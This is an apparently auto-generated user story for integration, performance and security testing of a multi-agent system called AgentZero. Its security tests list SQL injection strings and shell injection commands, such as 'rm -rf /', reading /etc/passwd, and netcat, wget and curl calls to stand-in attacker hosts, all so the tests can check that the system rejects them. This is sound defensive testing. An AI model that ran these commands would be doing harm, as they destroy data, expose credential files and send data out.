# Story 005: Integration Testing & Quality Assurance

## Story Overview
**Epic**: Quality & Integration
**Story ID**: STORY-005
**Priority**: P1 (High)
**Estimated Effort**: 8 story points
**Status**: Ready for Development
**Dependencies**: After core stories (001-004) are implemented

## User Story
**As a** development team
**I want to** have comprehensive integration testing
**So that** we can ensure all components work together reliably

## Acceptance Criteria

### AC1: Agent Integration Testing
- [ ] Test Planning Agent integration with HiveCoordinator
- [ ] Test Execution Agent integration with HiveCoordinator
- [ ] Test inter-agent communication flows
- [ ] Test agent registration and heartbeat mechanisms
- [ ] Test task distribution across multiple agents
- [ ] Test agent failure recovery scenarios

### AC2: API Integration Testing
- [ ] Test all REST endpoints with real Hive
- [ ] Test WebSocket connection lifecycle
- [ ] Test authentication flow end-to-end
- [ ] Test rate limiting with multiple users
- [ ] Test API error handling and recovery
- [ ] Test concurrent API requests handling

### AC3: Dashboard Integration Testing
- [ ] Test dashboard connection to API
- [ ] Test real-time updates via WebSocket
- [ ] Test dashboard state management
- [ ] Test error handling and recovery
- [ ] Test responsive design on multiple devices
- [ ] Test browser compatibility (Chrome, Firefox, Safari, Edge)

### AC4: End-to-End Workflow Testing
- [ ] Test complete task lifecycle (create → assign → execute → complete)
- [ ] Test planning workflow (plan → decompose → allocate)
- [ ] Test execution workflow (receive → execute → report)
- [ ] Test dashboard monitoring workflow
- [ ] Test multi-agent collaboration scenarios
- [ ] Test system recovery from various failure modes

### AC5: Performance Testing
- [ ] Load testing with 100 concurrent tasks
- [ ] Stress testing with 20 agents running
- [ ] API performance testing (1000 requests/min)
- [ ] WebSocket performance (50 concurrent connections)
- [ ] Dashboard performance with large datasets
- [ ] Memory leak detection and prevention

### AC6: Security Testing
- [ ] Penetration testing for API endpoints
- [ ] Authentication bypass attempts
- [ ] SQL injection testing
- [ ] XSS vulnerability testing
- [ ] Command injection testing (Execution Agent)
- [ ] Rate limiting bypass attempts

## Technical Implementation Details

### Test Framework Setup
```python
# tests/integration/conftest.py
import pytest
import asyncio
from typing import AsyncGenerator
import docker
import redis
from sqlalchemy.ext.asyncio import create_async_engine

@pytest.fixture(scope="session")
def event_loop():
    """Create event loop for async tests"""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()

@pytest.fixture(scope="session")
async def docker_services():
    """Start required Docker services"""
    client = docker.from_env()

    # Start Redis
    redis_container = client.containers.run(
        "redis:7-alpine",
        ports={'6379/tcp': 6379},
        detach=True,
        remove=True,
        name="test-redis"
    )

    # Start PostgreSQL (if needed)
    postgres_container = client.containers.run(
        "postgres:15-alpine",
        environment={
            "POSTGRES_PASSWORD": "testpass",
            "POSTGRES_DB": "agentzero_test"
        },
        ports={'5432/tcp': 5432},
        detach=True,
        remove=True,
        name="test-postgres"
    )

    # Wait for services to be ready
    await asyncio.sleep(5)

    yield {
        "redis": redis_container,
        "postgres": postgres_container
    }

    # Cleanup
    redis_container.stop()
    postgres_container.stop()

@pytest.fixture
async def hive_system(docker_services):
    """Start complete AgentZero system"""
    from main import AgentZeroSystem

    system = AgentZeroSystem({
        "research_agents": 2,
        "code_agents": 2,
        "planning_agents": 1,
        "execution_agents": 1
    })

    await system.initialize()
    task = asyncio.create_task(system.start())

    yield system

    system.shutdown()
    task.cancel()

@pytest.fixture
async def api_client(hive_system):
    """Create API test client"""
    from httpx import AsyncClient
    from src.api.main import app

    async with AsyncClient(app=app, base_url="http://test") as client:
        # Get auth token
        response = await client.post("/api/v1/auth/login", json={
            "username": "test_user",
            "password": "test_pass"
        })
        token = response.json()["access_token"]

        client.headers["Authorization"] = f"Bearer {token}"
        yield client
```

### Agent Integration Tests
```python
# tests/integration/test_agent_integration.py
import pytest
from src.agents.planning_agent import PlanningAgent
from src.agents.execution_agent import ExecutionAgent

@pytest.mark.asyncio
async def test_planning_agent_integration(hive_system):
    """Test Planning Agent integration with Hive"""
    # Submit planning task
    task_id = await hive_system.submit_task(
        "Create project plan for web application",
        task_type="planning"
    )

    # Wait for task completion
    await asyncio.sleep(5)

    # Verify task was processed
    status = await hive_system.get_task_status(task_id)
    assert status["status"] == "completed"
    assert status["result"]["plan"] is not None
    assert len(status["result"]["plan"]["phases"]) > 0

@pytest.mark.asyncio
async def test_execution_agent_security(hive_system):
    """Test Execution Agent security controls"""
    # Try to execute dangerous command
    task_id = await hive_system.submit_task(
        "Execute: rm -rf /",
        task_type="execution"
    )

    await asyncio.sleep(2)

    status = await hive_system.get_task_status(task_id)
    assert status["status"] == "failed"
    assert "security" in status["error"].lower()

@pytest.mark.asyncio
async def test_multi_agent_collaboration(hive_system):
    """Test agents working together"""
    # Create complex task requiring multiple agents
    task_id = await hive_system.submit_task(
        "Research Python frameworks and generate a comparison report",
        task_type="complex"
    )

    await asyncio.sleep(10)

    status = await hive_system.get_task_status(task_id)
    assert status["status"] == "completed"
    assert status["agents_involved"] >= 2
```

### API Integration Tests
```python
# tests/integration/test_api_integration.py
@pytest.mark.asyncio
async def test_api_agent_endpoints(api_client):
    """Test agent management via API"""
    # List agents
    response = await api_client.get("/api/v1/agents")
    assert response.status_code == 200
    agents = response.json()
    assert len(agents) > 0

    # Get specific agent
    agent_id = agents[0]["agent_id"]
    response = await api_client.get(f"/api/v1/agents/{agent_id}")
    assert response.status_code == 200
    assert response.json()["agent_id"] == agent_id

@pytest.mark.asyncio
async def test_websocket_integration(hive_system):
    """Test WebSocket real-time updates"""
    import websockets

    async with websockets.connect("ws://localhost:8001/ws?token=test_token") as ws:
        # Subscribe to events
        await ws.send(json.dumps({
            "type": "subscribe",
            "events": ["agent.status_changed", "task.completed"]
        }))

        # Trigger an event
        await hive_system.submit_task("Test task", task_type="simple")

        # Wait for event
        message = await asyncio.wait_for(ws.recv(), timeout=5.0)
        data = json.loads(message)
        assert data["type"] in ["agent.status_changed", "task.completed"]

@pytest.mark.asyncio
async def test_rate_limiting(api_client):
    """Test API rate limiting"""
    # Make many requests quickly
    responses = []
    for _ in range(150):
        response = await api_client.get("/api/v1/agents")
        responses.append(response.status_code)

    # Should hit rate limit
    assert 429 in responses  # Too Many Requests
```

### End-to-End Tests
```python
# tests/integration/test_e2e_workflows.py
@pytest.mark.asyncio
async def test_complete_planning_workflow(hive_system, api_client):
    """Test complete planning workflow via API"""
    # Create project specification
    project_spec = {
        "name": "E-commerce Platform",
        "description": "Online shopping platform",
        "requirements": ["User auth", "Product catalog", "Shopping cart"],
        "timeline": "3 months"
    }

    # Submit planning task via API
    response = await api_client.post("/api/v1/tasks", json={
        "name": "Create project plan",
        "description": "Generate comprehensive project plan",
        "task_type": "planning",
        "parameters": project_spec
    })
    assert response.status_code == 200
    task_id = response.json()["task_id"]

    # Monitor task progress
    for _ in range(30):  # Wait up to 30 seconds
        response = await api_client.get(f"/api/v1/tasks/{task_id}")
        status = response.json()["status"]
        if status == "completed":
            break
        await asyncio.sleep(1)

    assert status == "completed"

    # Verify plan was created
    response = await api_client.get(f"/api/v1/tasks/{task_id}")
    result = response.json()["result"]
    assert result["plan"]["phases"]
    assert result["plan"]["timeline"]
    assert result["plan"]["resource_allocation"]

@pytest.mark.asyncio
async def test_dashboard_monitoring_workflow():
    """Test dashboard monitoring with Selenium"""
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.wait import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC

    driver = webdriver.Chrome()
    try:
        # Load dashboard
        driver.get("http://localhost:3000")

        # Login
        driver.find_element(By.ID, "username").send_keys("test_user")
        driver.find_element(By.ID, "password").send_keys("test_pass")
        driver.find_element(By.ID, "login-btn").click()

        # Wait for dashboard to load
        wait = WebDriverWait(driver, 10)
        wait.until(EC.presence_of_element_located((By.CLASS_NAME, "agent-grid")))

        # Verify agents are displayed
        agents = driver.find_elements(By.CLASS_NAME, "agent-card")
        assert len(agents) > 0

        # Create a task
        driver.find_element(By.ID, "create-task-btn").click()
        driver.find_element(By.ID, "task-name").send_keys("Test Task")
        driver.find_element(By.ID, "submit-task").click()

        # Verify task appears in queue
        wait.until(EC.presence_of_element_located((By.XPATH, "//td[text()='Test Task']")))

    finally:
        driver.quit()
```

### Performance Tests
```python
# tests/integration/test_performance.py
import asyncio
import time
from concurrent.futures import ThreadPoolExecutor
import httpx

@pytest.mark.asyncio
async def test_concurrent_task_processing(hive_system):
    """Test system with many concurrent tasks"""
    start_time = time.time()

    # Submit 100 tasks concurrently
    tasks = []
    for i in range(100):
        task = hive_system.submit_task(
            f"Task {i}",
            task_type="simple"
        )
        tasks.append(task)

    task_ids = await asyncio.gather(*tasks)

    # Wait for all to complete (max 60 seconds)
    completed = 0
    for _ in range(60):
        statuses = await asyncio.gather(*[
            hive_system.get_task_status(tid) for tid in task_ids
        ])
        completed = sum(1 for s in statuses if s["status"] == "completed")
        if completed == 100:
            break
        await asyncio.sleep(1)

    duration = time.time() - start_time

    assert completed >= 95  # Allow 5% failure rate
    assert duration < 60  # Should complete within 60 seconds

    # Calculate throughput
    throughput = completed / duration
    assert throughput > 1.5  # At least 1.5 tasks per second

def test_api_load(api_client):
    """Load test API endpoints"""
    def make_request():
        response = httpx.get(
            "http://localhost:8000/api/v1/agents",
            headers={"Authorization": "Bearer test_token"}
        )
        return response.status_code, response.elapsed.total_seconds()

    # Make 1000 requests with 10 threads
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(make_request) for _ in range(1000)]
        results = [f.result() for f in futures]

    # Analyze results
    success_count = sum(1 for code, _ in results if code == 200)
    response_times = [time for _, time in results]

    assert success_count > 950  # 95% success rate
    assert sum(response_times) / len(response_times) < 0.2  # Avg < 200ms
    assert sorted(response_times)[int(len(response_times) * 0.95)] < 0.5  # p95 < 500ms
```

### Security Tests
```python
# tests/integration/test_security.py
@pytest.mark.asyncio
async def test_sql_injection(api_client):
    """Test SQL injection prevention"""
    malicious_inputs = [
        "'; DROP TABLE agents; --",
        "1' OR '1'='1",
        "admin'--",
        "' UNION SELECT * FROM users--"
    ]

    for payload in malicious_inputs:
        response = await api_client.get(f"/api/v1/agents?status={payload}")
        # Should handle safely
        assert response.status_code in [200, 400]
        # Database should still be intact
        response = await api_client.get("/api/v1/agents")
        assert response.status_code == 200

@pytest.mark.asyncio
async def test_command_injection(hive_system):
    """Test command injection prevention in Execution Agent"""
    dangerous_commands = [
        "echo test; rm -rf /",
        "test && cat /etc/passwd",
        "test | nc attacker.com 1234",
        "`wget http://evil.com/malware.sh`",
        "$(curl http://evil.com/steal-data)"
    ]

    for cmd in dangerous_commands:
        task_id = await hive_system.submit_task(
            f"Execute: {cmd}",
            task_type="execution"
        )

        await asyncio.sleep(1)

        status = await hive_system.get_task_status(task_id)
        assert status["status"] == "failed"
        assert "security" in status["error"].lower() or "not allowed" in status["error"].lower()

@pytest.mark.asyncio
async def test_authentication_bypass(api_client):
    """Test authentication bypass attempts"""
    # Try without token
    client = httpx.AsyncClient(base_url="http://localhost:8000")
    response = await client.get("/api/v1/agents")
    assert response.status_code == 401

    # Try with invalid token
    client.headers["Authorization"] = "Bearer invalid_token"
    response = await client.get("/api/v1/agents")
    assert response.status_code == 401

    # Try with expired token
    expired_token = create_expired_token()
    client.headers["Authorization"] = f"Bearer {expired_token}"
    response = await client.get("/api/v1/agents")
    assert response.status_code == 401
```

## Test Coverage Requirements

### Unit Test Coverage
- Minimum 90% code coverage for new code
- 100% coverage for security-critical code
- All edge cases covered

### Integration Test Coverage
- All API endpoints tested
- All agent interactions tested
- All workflows tested end-to-end
- All failure scenarios tested

### Performance Benchmarks
- API response time < 200ms (p95)
- Task processing > 1.5 tasks/second
- WebSocket latency < 50ms
- Dashboard load time < 2 seconds
- Memory usage < 1GB under normal load

## CI/CD Integration

### GitHub Actions Workflow
```yaml
# .github/workflows/integration-tests.yml
name: Integration Tests

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest

    services:
      redis:
        image: redis:7-alpine
        options: >-
          --health-cmd "redis-cli ping"
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
        ports:
          - 6379:6379

      postgres:
        image: postgres:15-alpine
        env:
          POSTGRES_PASSWORD: testpass
          POSTGRES_DB: agentzero_test
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
        ports:
          - 5432:5432

    steps:
      - uses: actions/checkout@v3

      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.9'

      - name: Install dependencies
        run: |
          pip install -r requirements.txt
          pip install -r requirements-test.txt

      - name: Run integration tests
        env:
          REDIS_URL: redis://localhost:6379
          DATABASE_URL: postgresql://postgres:testpass@localhost/agentzero_test
        run: |
          pytest tests/integration -v --cov=src --cov-report=xml

      - name: Upload coverage
        uses: codecov/codecov-action@v3
        with:
          file: ./coverage.xml

      - name: Run security tests
        run: |
          pytest tests/integration/test_security.py -v

      - name: Run performance tests
        run: |
          pytest tests/integration/test_performance.py -v
```

## Definition of Done

- [ ] All acceptance criteria met
- [ ] All test types implemented and passing
- [ ] Code coverage > 90%
- [ ] Performance benchmarks met
- [ ] Security tests passing
- [ ] CI/CD pipeline configured
- [ ] Test documentation complete
- [ ] No critical bugs
- [ ] Code reviewed and approved

## Dependencies

Add to `requirements-test.txt`:
```txt
pytest>=7.4.0
pytest-asyncio>=0.21.0
pytest-cov>=4.1.0
httpx>=0.24.0
websockets>=11.0
selenium>=4.12.0
locust>=2.15.0
docker>=6.1.0
faker>=19.0.0
```

## Related Documents
- PRD: `/docs/prd.md`
- Architecture: `/docs/architecture.md`
- All implementation stories (001-004)

---
**Created**: 2025-09-21
**Last Updated**: 2025-09-21
**Author**: BMad Workflow System